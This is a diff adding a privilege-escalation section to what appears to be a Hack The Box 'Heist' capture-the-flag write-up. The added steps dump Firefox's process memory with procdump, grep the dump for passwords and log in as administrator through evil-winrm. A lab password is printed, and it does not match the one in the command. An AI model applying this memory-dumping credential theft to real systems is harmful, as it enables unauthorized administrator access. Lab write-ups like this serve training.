@@ -146,9 +146,52 @@ We got user shell hehe. Lets go ahead and escalate our privileges
 
 # Privilege Escalation
 
-Checking the installed programs, I found this
+Running the ```ps``` command to check the processes running
 
-![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/caf2e25c-4847-4eae-b809-c129eee81be5)
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d6d43f37-4ccf-4210-b6ac-680a1fa34a73)
+
+From the above screenshot we can see ```firefox``` to be one of the processes running
+
+Lets try to dump the process using the tool ```procdump```. You can download it [here](https://download.sysinternals.com/files/Procdump.zip)
+
+We'll upload this to the target's machine
+
+command:```upload procdump.exe```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/dc1db26a-3f6a-42f4-bdc3-c2df787ec936)
+
+Nice, we can use the PID of firefox to create this dump
+
+command:```.\procdump.exe -accepteula -ma 4120```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/997e143e-31f7-4047-bce6-a209d020c16b)
+
+So after creating the dump, I downloaded it to my machine using the ```download``` command
+
+```
+┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/heist]
+└─$ ls           
+Eula.txt  Procdump.zip  firefox.exe_231011_124132.dmp  hash  heist  passwords.txt  procdump.exe  procdump64.exe  procdump64a.exe  users.txt
+                                                                                                                                                                                                                                             
+┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/heist]
+└─$ file firefox.exe_231011_124132.dmp                                                                               
+firefox.exe_231011_124132.dmp: Mini DuMP crash report, 18 streams, Wed Oct 11 07:11:32 2023, 0x461826 type
+```
+Now, lets look for creds
+
+command:```strings firefox.exe_231011_124132.dmp| grep "password"```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/466acabe-3802-4b09-a250-ddd05224e40f)
+
+nice nice, we got the admin password. 
+
+Now, lets use winrm to connect
+
+username:```administrator```      password:```4dD!5}x/re8]FBuZ```
+
+command:```evil-winrm -u administrator -i 10.129.94.141 -p "4dDpwd}x/re8]FBuZ"```
+
+
 
 
 
